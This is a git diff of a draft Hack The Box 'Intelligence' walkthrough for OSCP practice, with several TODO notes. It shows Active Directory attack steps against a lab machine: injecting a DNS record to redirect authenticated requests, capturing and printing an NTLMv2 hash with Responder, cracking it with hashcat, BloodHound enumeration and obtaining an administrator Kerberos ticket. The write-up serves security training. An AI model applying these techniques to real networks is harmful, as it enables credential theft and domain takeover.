@@ -6,8 +6,10 @@ tags: ["Hack The Box","OSCP"]
 ---
 {% assign imgDir="HTB-Intelligence-Writeup" %}
 
+TODO: Redo the dates and timestamps
+
 # Introduction
-The hack the box machine "Intelligence" is a medium machine which is included in [TJnull's OSCP Preparation List](). Exploiting this machine requires knowledge in the areas of 
+The hack the box machine "Intelligence" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge in the areas of 
 
 <img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">
 
@@ -18,7 +20,10 @@ We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.
 
 <!-- ![nmap](/assets/{{ imgDir }}/nmap.png) -->
 
-We notice DNS, LDAP, rpc
+It is clearly a windows host.
+We see two web servers. 
+We get domain name intelligence.htb and dc.intelligence.htb
+We can also see that there is a clock skew time. 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@sudo nmap -sSCV -p- 10.10.10.248@@
@@ -63,7 +68,7 @@ PORT      STATE SERVICE       VERSION
 | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
 | Not valid before: 2022-04-10T11:11:32
 |_Not valid after:  2023-04-10T11:11:32
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+@@@5985/tcp  open  http@@@          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 9389/tcp  open  mc-nmf        .NET Message Framing
@@ -76,7 +81,7 @@ PORT      STATE SERVICE       VERSION
 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
+|_@@@clock-skew@@@: mean: @@@7h00m00s@@@, deviation: 0s, median: @@@6h59m59s@@@
 | smb2-time: 
 |   date: 2022-04-10T14:03:33
 |_  start_date: N/A
@@ -87,6 +92,9 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 252.47 seconds
 {% endhighlight %}
+
+TODO: Add images of the web site. Explain why we create the python script
+TODO: Add intelligence.htb and dc.intelligence.htb to /etc/hosts
 
 {% highlight python linenos %}
 import datetime, requests
@@ -159,7 +167,7 @@ for date in dates:
 2020-03-04.pdf  2020-05-20.pdf  2020-06-26.pdf  2020-09-05.pdf  2020-11-11.pdf  2021-02-13.pdf
 
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ exiftool 2020-01-01.pdf       
+└─$ @@exiftool 2020-01-01.pdf@@
 ExifTool Version Number         : 12.40
 File Name                       : 2020-01-01.pdf
 Directory                       : .
@@ -355,7 +363,11 @@ smb: \> @@ls@@
 smb: \> @@get downdetector.ps1@@
 @@@getting file \downdetector.ps1 of size 1046 as downdetector.ps1@@@ (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
 smb: \> @@exit
-{% endhighlight %}@@
+{% endhighlight %}
+
+TODO: Explain endianness
+
+"ABC" 65,66,67,00. 0x65666700. 0x00676665
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -382,9 +394,15 @@ foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=Doma
 	} catch {}
 }
 {% endhighlight %}
-We see that it sends a request to all DNS records starting with "web". 
+TODO: explain code
 
-https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
+For loop loops through each child object of `AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` where the object name starts with the string "web". The child items of `AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` are a list of domains where each domain which starts "web" is a domain which should be ensured is up and running. Inside of the for loop, the [Invoke-WebRequest]() cmdlet is used to send a web request to each object we are iterating over in the for loop. The if clause at line x, checks if the response code for the response of this request does not equal a `200 OK`. If this is not the case, the web site is not running properly and an email is sent to the user `Ted Graves` to let him know that there is an issue with this particular web site. Something interesting to note here is that the Invoke-WebRequest cmdlet at line x is executed with the `-UseDefaultCredentials`. If we get a hold of these credentials, we might be able to use them elsewhere.
+
+Since we now that the for loop iterates over all DNS records in `AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` starting with the string "web", we could try to inject our own dns record which starts with this string and points to our attacker machine. This way, we could leak the credentials of the request. A good tool for this is [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) which was developed by x.
+
+We run this tool as demonstrated below. We use the `-u` and `-p` flags to provide the tool with the credentials of the `Tiffany Molina` user which we compromised earlier. We use the `--action` flag to specify that we want to add a new DNS record and the `--record` flag to specify that the record name should be "web-evil" since this name starts with the string "web". Then, we specify that this record name should resolve to our ip address using the `--data` flag and that it is an [A record]() using the `-type` flag. The last argument is simply the server we are targetting. From the output of the command, we see that the injection of the new record is successful! This means that the `Tiffany Molina` user has modification rights on this active directory object and that we should be able to trick the DownDetector.ps1 script into sending us authenticated web requests.
+
+https://en.wikipedia.org/wiki/List_of_DNS_record_types
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -412,6 +430,8 @@ dnstool.py                                                 100%[================
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ 
 {% endhighlight %}
+
+The next step is to catch one of the authenticated web requests. We can do this using responder as shown below. We use the `-I` flag to specify a network interface to listen on. In our case, this is `tun0` since this is the network interface which is facing the Hack The Box lab environment.
 
 {% highlight none linenos %}                                              
 ┌──(kali㉿kali)-[/tmp/x]
@@ -478,12 +498,18 @@ dnstool.py                                                 100%[================
     Responder Domain Name      [WYSN.LOCAL]
     Responder DCE-RPC Port     [49652]
 
-[+] Listening for events...                                            
+@@@[+] Listening for events...@@@                                            
 
 [HTTP] NTLMv2 Client   : ::ffff:10.10.10.248
 [HTTP] NTLMv2 @@@Username@@@ : @@@intelligence\Ted.Graves@@@
 [HTTP] NTLMv2 @@@Hash@@@     : @@@Ted.Graves::intelligence:1c47423e00010562:C83C77FCFC30BAF8877ED75A4D91B2AB:010100000000000027681B87FA4CD801AC8DD0EFE91FC03300000000020008005700590053004E0001001E00570049004E002D00370042005300480056004F004F004F004B004F004E00040014005700590053004E002E004C004F00430041004C0003003400570049004E002D00370042005300480056004F004F004F004B004F004E002E005700590053004E002E004C004F00430041004C00050014005700590053004E002E004C004F00430041004C000800300030000000000000000000000000200000D2ABF102A325442058319BD8B1CC36A197486CE75252F9AD0CB436C324745E6A0A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D006500760069006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000@@@
 {% endhighlight %}
+
+After a coupleo f minutes, we receive a web request which contains credentials for the `Ted Graves` user. We can try to crack these using hashcat as demonstrated below. Note  that -m 5600 is a NTLM hash, See ref here. We use the rockyou wordlist since it is relatively large and popular.
+
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+TODO: Include echo ... > hash
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -515,6 +541,12 @@ Started: Sun Apr 10 05:49:43 2022
 Stopped: Sun Apr 10 05:50:44 2022
 {% endhighlight %}
 
+After around a minute, the hash is cracked and we obtain the password `Mr.Teddy`. Next, we try to enumerate this user's capabilities using bloodhound.
+
+
+Add "rm *"?
+
+The bloodhound script finds 2 computers, 43 users and 55 groups in the domain. It also provides us with the names of the two computers it identified.
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@bloodhound-python -c ALL -u TED.GRAVES -p Mr.Teddy -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248@@
@@ -522,28 +554,52 @@ INFO: Found AD domain: intelligence.htb
 INFO: Connecting to LDAP server: intelligence.htb
 INFO: Found 1 domains
 INFO: Found 1 domains in the forest
-INFO: Found 2 computers
+INFO: @@@Found 2 computers@@@
 INFO: Connecting to LDAP server: intelligence.htb
-INFO: Found 43 users
-INFO: Found 55 groups
+INFO: @@@Found 43 users@@@
+INFO: @@@Found 55 groups@@@
 INFO: Found 0 trusts
 INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: svc_int.intelligence.htb
-INFO: Querying computer: dc.intelligence.htb
+INFO: Querying computer: @@@svc_int.intelligence.htb@@@
+INFO: Querying computer: @@@dc.intelligence.htb@@@
 WARNING: Could not resolve: svc_int.intelligence.htb: The resolution lifetime expired after 3.2134337425231934 seconds: Server 10.10.10.248 UDP port 53 answered The DNS operation timed out.; Server 10.10.10.248 UDP port 53 answered The DNS operation timed out.
 INFO: Done in 00M 13S
                                                                                                                     
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ ls
+[...]
 @@@20220411130157_computers.json  20220411130157_domains.json  20220411130157_groups.json  20220411130157_users.json@@@
-                                                                                                                    
+[...]                                                                                                               
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ 
 {% endhighlight %}
 
-Next, we start neo4j (the bloodhound db) by executing "neo4j start". Then we execute "bloodhound" to start bloodhound.
 
-We login
+Next, we will import the output files into bloodhound to analyze them. we start neo4j (the bloodhound db) by executing "neo4j start". Then we execute "bloodhound" to start bloodhound.
+
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@sudo neo4j start@@
+Directories in use:
+home:         /usr/share/neo4j
+config:       /usr/share/neo4j/conf
+logs:         /usr/share/neo4j/logs
+plugins:      /usr/share/neo4j/plugins
+import:       /usr/share/neo4j/import
+data:         /usr/share/neo4j/data
+certificates: /usr/share/neo4j/certificates
+licenses:     /usr/share/neo4j/licenses
+run:          /usr/share/neo4j/run
+Starting Neo4j.
+@@@Started neo4j@@@ (pid:153091). It is available at http://localhost:7474
+There may be a short delay until the server is ready.
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@bloodhound@@   
+[...]
+{% endhighlight %}
+
+We login. If you don't have these credentials set up, TODO..
 
 ![bLogin](/assets/{{ imgDir }}/bLogin.png)
 
@@ -584,6 +640,8 @@ We do the same with tiffany. Then, we navigate to the analysis tab and press
 ![bShortest2](/assets/{{ imgDir }}/bShortest2.png)
 
 ![bShortest3](/assets/{{ imgDir }}/bShortest3.png)
+
+TODO: Explain the graph and the vulns (I.e the attack plan)
 
 If we go to the SVC node, we can find the SPN
 
@@ -641,16 +699,15 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] @@@Saving ticket in administrator.ccache@@@
 
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ @@ls@@
-20220411131741_computers.json  20220411131741_domains.json  20220411131741_groups.json  20220411131741_users.json   @@@administrator.ccache@@@  gMSADumper.py
-
-┌──(kali㉿kali)-[/tmp/x]
-└─$ 
+└─$ @@ls -lh@@
+[...]
+-rw-r--r-- 1 kali kali 1.6K Apr 23 21:47 @@@administrator.ccache@@@
+[...]
 {% endhighlight %}
+Todo: Change 'ls' to 'ls -l'
 
 
-
-Next, we create an environment variable named x which points to the file x which contains our tgt.
+Next, we create an environment variable named "KRB5CCNAME" which points to the file `administrator.ccache` which contains our tgt.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
